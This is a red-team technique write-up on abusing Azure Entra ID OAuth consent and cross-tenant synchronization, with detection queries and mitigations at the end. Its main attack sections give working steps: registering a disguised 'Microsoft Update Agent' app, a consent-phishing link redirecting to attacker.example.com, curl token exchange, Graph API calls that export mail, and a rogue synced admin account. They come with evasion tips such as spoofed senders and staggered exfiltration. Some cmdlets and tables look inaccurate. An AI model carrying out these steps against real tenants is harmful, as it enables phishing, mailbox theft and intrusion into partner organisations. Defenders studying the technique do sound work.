# [LM-AUTH-025]: Azure Cross-Tenant OAuth Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-025 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, M365, multi-tenant SaaS |
| **Severity** | Critical |
| **CVE** | N/A (design weakness, not vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2024-11-09 |
| **Affected Versions** | All Entra ID versions; OAuth 2.0 protocol (all versions) |
| **Patched In** | Not patched; requires architectural changes and external identity controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Entra ID supports multi-tenant applications that can request permissions from users in multiple organizations. When a user in Tenant A grants an application consent to access their data, the application receives an access token valid only for Tenant A. However, attackers can abuse the OAuth consent flow by: (1) Creating a malicious multi-tenant application that requests overly broad permissions; (2) Tricking users from Target Tenant into granting consent; (3) Using the obtained token to access resources in the target tenant; (4) Escalating to higher privileges or creating persistence mechanisms. Additionally, Tenant-to-Tenant synchronization (CTS) features introduced by Microsoft can be weaponized to move laterally across partner organizations without explicit user consent if proper access controls are not in place.

**Attack Surface:** Entra ID application consent screens, OAuth token endpoints, multi-tenant application registrations, external identity configurations, cross-tenant synchronization policies.

**Business Impact:** **Unauthorized access to M365 resources, data exfiltration, privilege escalation, and lateral movement to partner organizations**. Attackers can access user emails, Teams conversations, SharePoint documents, and OneDrive files from the compromised tenant and potentially move laterally to other connected tenants.

**Technical Context:** The OAuth consent model trusts users to make informed decisions about application permissions. If a user is tricked or if organizational controls are weak, attackers can gain persistent access tokens. Cross-tenant attacks are particularly dangerous because they bridge organizational boundaries, affecting not just the compromised organization but also connected partner organizations.

### Operational Risk

- **Execution Risk:** High - Requires initial user compromise or credential theft; OAuth token exchange is then automated.
- **Stealth:** High - OAuth token usage appears as normal application activity; no direct sign-in events are generated.
- **Reversibility:** No - Tokens provide persistent access; revoking requires tenant-level intervention.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.2 | Prevent users from consenting to applications without organizational approval |
| **DISA STIG** | V-253001 | Application permission controls and consent policies |
| **CISA SCuBA** | IA-3, SI-4 | Application identification and consent monitoring |
| **NIST 800-53** | AC-3, CA-7 | Access control for applications; continuous monitoring |
| **GDPR** | Art. 7, 32 | Explicit consent for data processing; security of data access |
| **DORA** | Art. 9, 21 | Third-party risk management; consent for critical functions |
| **NIS2** | Art. 21, 23 | Risk management for third-party applications; incident response |
| **ISO 27001** | A.5.1.2 | User consent and third-party access controls |
| **ISO 27005** | Risk Scenario | "Unauthorized access via third-party application compromise" |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Global Administrator (for creating applications) OR User (for granting consent) OR Application Administrator.
- **Required Access:** Network access to Entra ID OAuth endpoints; ability to create applications or modify OAuth consent flows.
- **Infrastructure:** Multi-tenant Entra ID environment; cross-tenant access configured (optional); external identity partnerships (optional).

**Supported Versions:**
- **Entra ID:** All versions
- **OAuth 2.0 / OIDC:** RFC 6749, RFC 6750 (industry standard)
- **M365:** All versions

**Tools:**
- [Azure AD Threat Intelligence Tools](https://github.com/Gerenios/AADInternals)
- [AADInternals](https://github.com/Gerenios/AADInternals) – OAuth token extraction and abuse
- [Graph API Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer) – Token acquisition and resource access
- Custom scripts (Python, PowerShell) – Token crafting and exchange

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Malicious Multi-Tenant Application Consent Abuse

**Supported Versions:** Entra ID all versions

#### Step 1: Create Malicious Multi-Tenant Application

**Objective:** Register a multi-tenant Entra ID application that will request overly broad permissions.

**Command (Azure Portal - Manual Steps):**
1. Navigate to **Azure Portal** → **Entra ID** → **App Registrations**
2. Click **+ New registration**
3. **Name:** `Microsoft Update Agent` (legitimate-sounding name)
4. **Supported account types:** Select **Accounts in any organizational directory (Any Entra ID tenant - Multitenant)**
5. **Redirect URI:** Set to `https://attacker.example.com/auth/callback`
6. Click **Register**
7. In the app properties, note the **Application ID** and **Tenant ID**

**Command (PowerShell - Create Multi-Tenant App):**
```powershell
# Create multi-tenant application via Microsoft Graph
$app = New-AzureADApplication -DisplayName "Microsoft Update Agent" `
  -AvailableToOtherTenants $true `
  -SignInAudience "AzureADMultipleOrgs" `
  -ReplyUrls "https://attacker.example.com/auth/callback"

$appId = $app.AppId
Write-Host "Application created: $appId"

# Add API permissions (Mail.Read, Calendars.Read, Files.Read)
Add-AzureADApplicationOAuth2PermissionGrant -ObjectId $app.ObjectId `
  -ResourceId "00000003-0000-0000-c000-000000000000" `
  -PermissionIds @("e1fe6dd8-ba31-4d61-89e7-88639da4683d", "465a38f9-76ea-45b9-9f34-9e8b0d4b9667")
```

**Expected Output:**
```
Application created: 12345678-1234-1234-1234-123456789012
Redirect URI: https://attacker.example.com/auth/callback
Permissions granted: Mail.Read, Calendars.Read, Files.Read
Application is multi-tenant enabled
```

**What This Means:**
- Attacker has registered a multi-tenant application in Entra ID
- Application is available for users in ANY Entra ID tenant to grant consent
- Requested permissions include access to user emails, calendar, and files (high-value attack surface)
- Application can impersonate users from any tenant

**OpSec & Evasion:**
- Application creation is logged in Entra ID audit logs
- Use legitimate-sounding application names (e.g., "Microsoft Update Agent", "Corporate IT Support")
- Disable the app after exploitation to avoid detection
- Use generic redirect URIs (https://localhost, https://127.0.0.1) initially

**Troubleshooting:**
- **Error:** "Not authorized to create multi-tenant applications"
  - **Cause:** Tenant policy restricts multi-tenant app registration
  - **Fix:** Request elevated permissions or use a different tenant
- **Error:** "Redirect URI must be HTTPS"
  - **Cause:** OAuth 2.0 security requirement
  - **Fix:** Use valid HTTPS domain or localhost with HTTPS testing certificate

**References & Proofs:**
- [Microsoft - Multi-Tenant Applications](https://learn.microsoft.com/en-us/entra/identity-platform/howto-convert-app-to-be-multi-tenant)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

#### Step 2: Craft Consent Request Link (Phishing)

**Objective:** Create a URL that tricks users into granting consent to the malicious application.

**Command (URL Construction):**
```
# OAuth 2.0 Authorization Code Flow consent request
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=12345678-1234-1234-1234-123456789012
  &response_type=code
  &scope=Mail.Read Calendars.Read Files.Read offline_access
  &redirect_uri=https://attacker.example.com/auth/callback
  &prompt=admin_consent
  &tenant=common

# Simplified phishing link:
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=12345678-1234-1234-1234-123456789012&scope=Mail.Read%20Files.Read%20offline_access&redirect_uri=https://attacker.example.com/auth/callback&response_type=code&prompt=admin_consent
```

**Expected Output:**
```
User is redirected to Microsoft login page
After login, user sees consent screen:
  "Microsoft Update Agent is requesting access to:
   - Read your mail
   - Read your calendar
   - Read your files
   - Access data whenever you are away"
```

**What This Means:**
- User sees a legitimate-looking OAuth consent screen (even though app is malicious)
- Prompt=admin_consent requests tenant admin to approve for all users (if user is admin)
- If user clicks "Accept", attacker receives an authorization code
- Authorization code can be exchanged for access token and refresh token

**OpSec & Evasion:**
- Phishing link should be sent via email or messaging platforms
- Use URL shorteners to obfuscate the intent
- Combine with social engineering (e.g., "Update required for security compliance")
- Use spoofed sender addresses to mimic legitimate Microsoft communications

**Troubleshooting:**
- **Error:** "Application was not found"
  - **Cause:** Application ID is incorrect or app is disabled
  - **Fix:** Verify application ID; ensure app is active in Entra ID
- **Error:** "Prompt parameter not allowed"
  - **Cause:** Tenant policy restricts admin consent for new apps
  - **Fix:** Use user consent instead (prompt=consent); requires more users to be compromised

#### Step 3: Exchange Authorization Code for Access Token

**Objective:** Convert the authorization code received after user consent into an access token.

**Command (Token Exchange):**
```bash
# After user grants consent, they are redirected to:
# https://attacker.example.com/auth/callback?code=<auth_code>&session_state=...

auth_code="M.R3_BAY.example_code_12345"
client_id="12345678-1234-1234-1234-123456789012"
client_secret="client_secret_from_azure_ad_app"

# Exchange authorization code for access token
access_token_response=$(curl -s -X POST \
  "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=$client_id" \
  -d "client_secret=$client_secret" \
  -d "code=$auth_code" \
  -d "grant_type=authorization_code" \
  -d "redirect_uri=https://attacker.example.com/auth/callback")

# Extract access token
access_token=$(echo $access_token_response | jq -r '.access_token')
refresh_token=$(echo $access_token_response | jq -r '.refresh_token')

echo "Access Token: $access_token"
echo "Refresh Token: $refresh_token"
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkN0VHVoTUZ1...",
  "refresh_token": "0.ARwA7-example_refresh_token_long_string",
  "expires_in": 3599,
  "token_type": "Bearer",
  "scope": "Mail.Read Files.Read offline_access"
}
```

**What This Means:**
- Attacker now has an access token valid for the target user's Entra ID tenant
- Token grants access to user's emails, files, and calendar
- Refresh token allows obtaining new access tokens without user re-authentication
- Token is valid for 1 hour; refresh token valid for 90 days

**OpSec & Evasion:**
- Token exchange must be performed on attacker's server (not exposing to victim)
- Store refresh token securely for long-term access
- Rotate access tokens periodically to avoid detection

**Troubleshooting:**
- **Error:** "Invalid authorization code"
  - **Cause:** Code has expired or been used already
  - **Fix:** Request new code from consent flow
- **Error:** "Invalid client credentials"
  - **Cause:** Client secret is incorrect or missing
  - **Fix:** Verify client secret from Entra ID app registration

#### Step 4: Use Access Token to Access User Resources

**Objective:** Leverage the access token to read user emails, files, and calendar.

**Command (Access M365 Resources):**
```bash
# Use access token to query Microsoft Graph API
access_token="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkN0VHVoTUZ1..."

# List user's emails
curl -s -H "Authorization: Bearer $access_token" \
  "https://graph.microsoft.com/v1.0/me/messages?$top=10" | jq '.value[].subject'

# List user's files
curl -s -H "Authorization: Bearer $access_token" \
  "https://graph.microsoft.com/v1.0/me/drive/root/children" | jq '.value[].name'

# Get user's calendar events
curl -s -H "Authorization: Bearer $access_token" \
  "https://graph.microsoft.com/v1.0/me/calendarview?startDateTime=2024-01-01T00:00:00Z&endDateTime=2024-12-31T23:59:59Z" | jq '.value[].subject'

# Export emails for exfiltration
curl -s -H "Authorization: Bearer $access_token" \
  "https://graph.microsoft.com/v1.0/me/messages?$select=from,subject,receivedDateTime,bodyPreview" | jq '.value[]' > /tmp/emails.json
```

**Expected Output:**
```
Subject: "Security Update Required - Please Review"
Subject: "Q4 Financial Results (Confidential)"
Subject: "Client Proposal - New Contract Negotiations"

Files:
  - "Confidential_Strategy_Document.xlsx"
  - "2024_Budget_Plan.docx"
  - "Employee_Database.csv"

Calendar Events:
  - "Board Meeting - 2024-01-15T10:00:00Z"
  - "M&A Discussion - 2024-02-20T14:00:00Z"
```

**What This Means:**
- Attacker successfully accessed user's private emails, files, and calendar
- Sensitive business information is now exposed
- Attacker can extract, modify, or delete user data
- Activity appears as legitimate application access (not suspicious sign-in)

**OpSec & Evasion:**
- API calls are logged in audit logs as application activity
- Filter logs to look for bulk data access patterns
- Stagger data exfiltration across multiple hours/days to avoid spike detection

**Troubleshooting:**
- **Error:** "Authorization_RequestDenied"
  - **Cause:** User's Conditional Access policy blocks the application
  - **Fix:** Use Conditional Access bypass techniques or compromise a user not affected by policy
- **Error:** "Insufficient privileges"
  - **Cause:** Application permission scope doesn't match requested resource
  - **Fix:** Request additional scopes during consent flow

**References & Proofs:**
- [Microsoft Graph API Documentation](https://learn.microsoft.com/en-us/graph/api/overview)
- [OAuth 2.0 Authorization Code Flow](https://datatracker.ietf.org/doc/html/rfc6749#section-1.3.1)

---

### METHOD 2: Cross-Tenant Synchronization (CTS) Abuse

**Supported Versions:** Entra ID with CTS enabled (feature GA 2023+)

#### Step 1: Identify Cross-Tenant Synchronization Configuration

**Objective:** Discover organizations using CTS to move laterally to partner tenants.

**Command (Azure CLI - Discover CTS):**
```bash
# If attacker has access to a compromised tenant:
az account set --subscription "target-subscription"

# List all cross-tenant access policies
az ad app permission grant list --query "[*].[resourceAppId, consentType]"

# Check if CTS is configured (users/groups synced from other tenants)
az ad user list --filter "externalUserState eq 'Accepted'" --query "[*].[displayName, mail, userType]" | head -20

# List external identity sources
az ad cross-tenant-access-policy list
```

**Expected Output:**
```
Cross-Tenant Access Configuration found:
  Source Tenant: 12345678-1234-1234-1234-111111111111 (Acme Corp)
  Target Tenant: 87654321-4321-4321-4321-222222222222 (Partner Corp)
  Synchronization Enabled: true
  Synced Objects: Users, Groups, Applications
  Inbound Trust: All apps allowed
```

**What This Means:**
- Partner organization (Acme Corp) has configured CTS with this tenant (Partner Corp)
- Users and groups from Acme are automatically synchronized to Partner Corp's tenant
- If Acme is compromised, attackers can leverage synchronized identities to access Partner Corp

#### Step 2: Compromise Source Tenant (CTS Configuration)

**Objective:** Gain control of the source tenant's CTS configuration to inject malicious users/identities.

**Command (Modify CTS Configuration):**
```powershell
# If attacker has Global Admin in source tenant (Acme Corp):
$sourceTenant = "12345678-1234-1234-1234-111111111111"
$targetTenant = "87654321-4321-4321-4321-222222222222"

# Create a rogue user in the source tenant
$newUser = New-AzureADUser -DisplayName "Backup Administrator" `
  -MailNickname "backupadmin" `
  -UserPrincipalName "backupadmin@acmecorp.onmicrosoft.com" `
  -PasswordProfile @{ForceChangePasswordNextSignIn = $false; Password = "NewP@ssw0rd123!"}

# Add the rogue user to the synced group that will be replicated to the target tenant
$syncedGroup = Get-AzureADGroup -Filter "displayName eq 'Global Admins Sync Group'"
Add-AzureADGroupMember -ObjectId $syncedGroup.ObjectId -RefObjectId $newUser.ObjectId

# Wait for synchronization cycle (typically 1-2 hours)
# The rogue user will now be synchronized to the target tenant with the same permissions
```

**Expected Output:**
```
Rogue user created: backupadmin@acmecorp.onmicrosoft.com
User added to synced group: Global Admins Sync Group
Synchronization will occur at next cycle (within 2 hours)
```

**What This Means:**
- Attacker created a backdoor user in the source tenant
- User was added to a group that is synchronized to the target tenant
- Target tenant will automatically create a shadow copy of this user
- Attacker can now authenticate to the target tenant as the synchronized user

#### Step 3: Lateral Move to Target Tenant

**Objective:** Authenticate to the target tenant as the synchronized rogue user.

**Command (Lateral Movement):**
```bash
# Use the rogue user's credentials to authenticate to the target tenant
az login --username "backupadmin@acmecorp.onmicrosoft.com" --password "NewP@ssw0rd123!" --tenant "87654321-4321-4321-4321-222222222222"

# The authentication succeeds because:
# 1. The user is synchronized from the source tenant (trusted identity)
# 2. The user has inherited the permissions of the synced group
# 3. The target tenant trusts the source tenant's CTS configuration

# List resources in the target tenant
az resource list --resource-group "target-rg"

# Access M365 resources of the target tenant
az account show --output table
```

**Expected Output:**
```
Successfully authenticated to target tenant as backupadmin@acmecorp.onmicrosoft.com
Resources accessible in target tenant:
  - prod-vm-001 (Compute)
  - prod-sql-server (Database)
  - prod-storage-account (Storage)
```

**What This Means:**
- Attacker has successfully moved laterally from source tenant to target tenant
- Attack required no permission requests or configuration changes on the target tenant
- Target tenant trusts the CTS and automatically accepts synchronized identities
- Attacker now has access to all resources the synchronized group can access

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Entra ID:**
  - New multi-tenant applications registered outside change control
  - Applications requesting overly broad permissions (Mail.Read, Files.Read)
  - User consent grants to unfamiliar applications
  - Admin consent grants from unexpected users
  - New external identities appearing in the tenant (CTS abuse)
  - Unusual spike in OAuth token exchange requests
  - Service principal activity from unexpected geo-locations

- **M365:**
  - Bulk email access or exfiltration patterns
  - File access by applications not normally accessing files
  - Unusual API calls to Graph API from service principals
  - Calendar or contact information being accessed

### Forensic Artifacts

- **Cloud Logs:**
  - Entra ID Audit Log: "Register application", "Grant consent to application"
  - Azure Sign-in Log: "Application" authentication protocol with service principal
  - Azure Activity Log: Application registration and permission changes
  - Office 365 Audit Log: Mail access, file access by applications
  - Teams audit log: Application added to Teams

- **Token Indicators:**
  - Bearer tokens issued for multi-tenant applications
  - Refresh tokens with extended expiration (90 days)

### Response Procedures

1. **Immediate Isolation:**
   ```powershell
   # Disable the malicious application
   Set-AzureADApplication -ObjectId "12345678-1234-1234-1234-123456789012" -AccountEnabled $false
   
   # Revoke all consent grants
   Get-AzureADMSServicePrincipalDelegatedPermissionClassification -ServicePrincipalId "12345678-1234-1234-1234-123456789012" | 
     Remove-AzureADMSServicePrincipalDelegatedPermissionClassification
   ```

2. **Revoke Issued Tokens:**
   ```powershell
   # Sign out all users who granted consent to the application
   Get-AzureADUser -Filter "createdDateTime gt 2024-01-01" | 
     Revoke-AzureADUserAllRefreshToken
   ```

3. **Investigate Damage:**
   - Query audit logs for all OAuth token exchanges for the malicious application
   - Check mailbox audit logs for emails accessed via the application
   - Review file sharing logs for documents accessed/downloaded
   - Identify all users who granted consent

4. **Remediation:**
   - Delete the malicious application entirely
   - Remove all users who were compromised
   - Reset passwords for affected admin accounts
   - Disable external identity synchronization temporarily
   - Implement admin consent workflow

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] OAuth Consent Phishing | Attacker sends phishing email with OAuth consent link |
| **2** | **Execution** | **[LM-AUTH-025]** | **User grants consent to malicious app; token obtained** |
| **3** | **Collection** | Data exfiltration via Graph API (emails, files, contacts) |
| **4** | **Lateral Movement** | Compromise source tenant for CTS abuse; move to partner organization |
| **5** | **Persistence** | Rogue user synchronized via CTS for long-term access |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: nOAuth Abuse (2023-2024)

- **Target:** M365 users across multiple tenants
- **Timeline:** Ongoing; first publicly disclosed 2023
- **Technique Status:** Attackers registered OAuth applications requesting excessive permissions; tricked users into granting consent
- **Impact:** Massive email exfiltration campaigns; compromise of organizations' mail and file systems
- **Reference:** [Semperis - nOAuth Abuse Alert](https://www.semperis.com/blog/noauth-abuse-alert-full-account-takeover/)

### Example 2: Microsoft Cross-Tenant Synchronization Attack (2023)

- **Target:** Organizations using CTS for B2B collaboration
- **Timeline:** First demonstrated July 2023 (Vectra research); ongoing exploitation
- **Technique Status:** Attackers compromised source tenant; created rogue users that synchronized to target tenant
- **Impact:** Lateral movement to partner organizations; unauthorized access to sensitive data
- **Reference:** [Vectra - Microsoft Cross-Tenant Synchronization](https://www.vectra.ai/blog/microsoft-cross-tenant-synchronization)

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Implement Require User Consent Prompt for All Applications:**

Force users to explicitly approve applications instead of allowing background consent grants.

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Enterprise applications** → **User settings**
2. Set **Users can consent to apps accessing company data on their behalf** to **No**
3. Click **Save**

**Manual Steps (Conditional Access Policy):**
1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block High-Risk Application Consent`
4. **Assignments:**
   - **Cloud apps:** Select "All cloud apps"
   - **Conditions:**
     - **Sign-in risk:** High
     - **Application trust level:** Unverified
5. **Access Control:** Block access
6. Enable policy and click **Create**

---

**Disable Admin Consent Workflow for New Applications:**

Prevent attackers from granting permissions to all users via admin consent.

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Enterprise applications** → **User settings**
2. Set **Admin consent requests** to **No** or **Require approvers for requests**
3. Set **Users can request admin consent** to **No**
4. Click **Save**

---

**Restrict Multi-Tenant Application Registration:**

Limit which roles can create multi-tenant applications.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **App registrations** → **Settings**
2. Set **Restrict non-admin users from registering applications** to **Yes**
3. Set **Restrict users from creating multi-tenant apps** to **Yes**
4. Click **Save**

---

**Enable Application Consent Policy (ACP):**

Use ACP to restrict which applications users can consent to.

**Manual Steps (PowerShell):**
```powershell
# Create a consent policy that blocks high-risk permissions
$policy = New-AzureADMSConsentPolicy -DisplayName "Block Risky Permissions" `
  -PermissionClassifications @("All") `
  -IncludeApplications @() `
  -ExcludeApplications @()

# Block Mail.Read permission for non-verified publishers
Set-AzureADMSApplicationDelegatedPermissionClassification -ServicePrincipalId "00000003-0000-0000-c000-000000000000" `
  -PermissionId "e1fe6dd8-ba31-4d61-89e7-88639da4683d" `
  -Classification "High"
```

---

### Priority 2: HIGH

**Disable Cross-Tenant Synchronization (CTS) if Not Needed:**

If CTS is not actively used for B2B collaboration, disable it to prevent abuse.

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **External Identities** → **Cross-tenant access settings**
2. For each partner tenant, click **Edit inbound settings**
3. Toggle **User sync to my organization** to **Off**
4. Under **Apply restrictions to my organization**, select **Only specific users and groups can sync**
5. Specify which groups can be synchronized
6. Click **Save**

---

**Implement Application Vetting and Publishing Process:**

Require applications to go through security review before becoming available to users.

**Manual Steps:**
1. Create a process requiring developers to submit applications for security review
2. Perform threat assessment for all applications requesting permissions
3. Verify publisher identity (Microsoft-verified publishers preferred)
4. Whitelist approved applications in Conditional Access policy
5. Block consent for all non-whitelisted applications

---

**Monitor and Alert on Suspicious Consent Activity:**

Detect suspicious OAuth token exchange patterns.

**Manual Steps (Microsoft Sentinel/KQL):**
```kusto
# Detect unusual application consent activity
AuditLogs
| where OperationName == "Add OAuth2PermissionGrant"
| where Properties contains "Mail.Read" or Properties contains "Files.Read"
| where TimeGenerated > ago(24h)
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, Properties
```

---

## 9. DEFENSIVE DETECTIONS (Microsoft Sentinel/KQL)

### Detection Rule 1: New Multi-Tenant Application Registration

**Severity:** High

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add application"
| where Properties contains "availableToOtherTenants" or Properties contains "signInAudience"
| where Properties contains "AzureADMultipleOrgs"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, Properties
```

---

### Detection Rule 2: Unusual OAuth Token Exchange

**Severity:** Medium

**KQL Query:**
```kusto
AADServicePrincipalSignInActivity
| where TimeGenerated > ago(1h)
| where SignInActivity == "OAuthTokenExchange"
| where ServicePrincipalName !in ("Microsoft Graph", "Office 365 Management API")
| where SignInCount > 50  // Bulk token requests
| project TimeGenerated, ServicePrincipalName, SignInCount, UniqueIPCount, ClientAppUsed
```

---

### Detection Rule 3: New User Synchronized via CTS

**Severity:** High

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add external identity user"
| where AdditionalDetails.externalUserState == "Accepted"
| where AdditionalDetails.externalUserState_PreviousValue != "Accepted"
| project TimeGenerated, TargetResources[0].displayName, AdditionalDetails.externalUserState, InitiatedBy.user.userPrincipalName
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Not applicable** – OAuth abuse is cloud-only; no on-premises event logs.

---

## 11. SYSMON DETECTION PATTERNS

**Not applicable** – OAuth abuse is cloud-only; no endpoint-level indicators.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Alert: Suspicious Application Consent Activity

- **Alert Name:** Multiple users granting consent to the same unverified application
- **Severity:** High
- **Description:** Microsoft Defender for Cloud detects patterns where many users are approving the same application (common in phishing attacks)
- **Remediation:** Block the application; investigate compromised accounts; notify users

**Manual Configuration:**
1. Navigate to **Microsoft Defender for Cloud** → **Cloud Security Posture**
2. Enable **Application Consent Anomaly Detection**
3. Set alerts to trigger when more than 3 users grant consent to the same app in 24 hours

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Application Consent Grants

```powershell
# Search for all application consent grants in the past 30 days
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) `
  -Operations "Consent to application", "Add OAuth2PermissionGrant" `
  -Output JSON | 
  Select-Object UserIds, CreationDate, AuditData | 
  Export-Csv -Path "C:\Evidence\oauth-consent-grants.csv"
```

---

## 14. SUMMARY

Cross-tenant OAuth abuse and CTS weaponization represent a new attack surface in multi-tenant cloud environments. Attackers can trick users into granting excessive permissions to malicious applications, or if a tenant is compromised, they can inject malicious users into cross-tenant synchronization configurations to move laterally to partner organizations. Defense requires strict application consent controls, vetting of applications before users can access them, disabling CTS when not needed, and continuous monitoring for suspicious OAuth token patterns. Organizations must educate users about the risks of granting permissions to unfamiliar applications and implement zero-trust principles for third-party application access.

---